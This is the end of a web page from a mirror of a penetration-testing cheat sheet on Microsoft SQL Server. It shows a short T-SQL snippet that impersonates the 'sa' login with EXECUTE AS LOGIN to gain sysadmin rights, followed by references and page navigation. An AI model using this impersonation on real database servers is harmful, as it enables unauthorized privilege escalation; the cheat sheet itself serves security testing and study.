</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
<span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">'stduser'</span>
<span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">'sa'</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
<span class="k">SELECT</span> <span class="n">ORIGINAL_LOGIN</span><span class="p">()</span>
<span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3">PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</a></li>
  <li><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">PowerUpSQL Cheat Sheet - Scott Sutherland</a></li>
  <li><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/cheatsheet/'>Cheatsheet</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/server/"
            class="post-tag no-text-decoration" >Server</a>
          
          <a href="/tags/database/"
            class="post-tag no-text-decoration" >Database</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Mssql server   cheatsheet - PayloadsAllTheThings&url=http://localhost:4000/MSSQL-Server-Cheatsheet/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Mssql server   cheatsheet - PayloadsAllTheThings&u=http://localhost:4000/MSSQL-Server-Cheatsheet/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Mssql server   cheatsheet - PayloadsAllTheThings&url=http://localhost:4000/MSSQL-Server-Cheatsheet/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/HQL-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Oct 29, 2019
  

  <i class="unloaded">2019-10-29T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HQL Injection</h3>
            <div class="text-muted small">
              <p>
                





                Hibernate Query Language Injection


  Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-orien...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/JSON-Web-Token/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 17, 2020
  

  <i class="unloaded">2020-04-17T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>JWT - JSON Web Token</h3>
            <div class="text-muted small">
              <p>
                





                JWT - JSON Web Token


  JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. Th...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Insecure-Direct-Object-References/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 22, 2020
  

  <i class="unloaded">2020-04-22T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Insecure Direct Object References</h3>
            <div class="text-muted small">
              <p>
                





                Insecure Direct Object References


  Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability a...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/Server-side-Request-Forgery/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Server Side Request Forgery</p>
  </a>
  

  
  <a href="/Windows-AMSI-Bypass/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Windows   amsi bypass</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

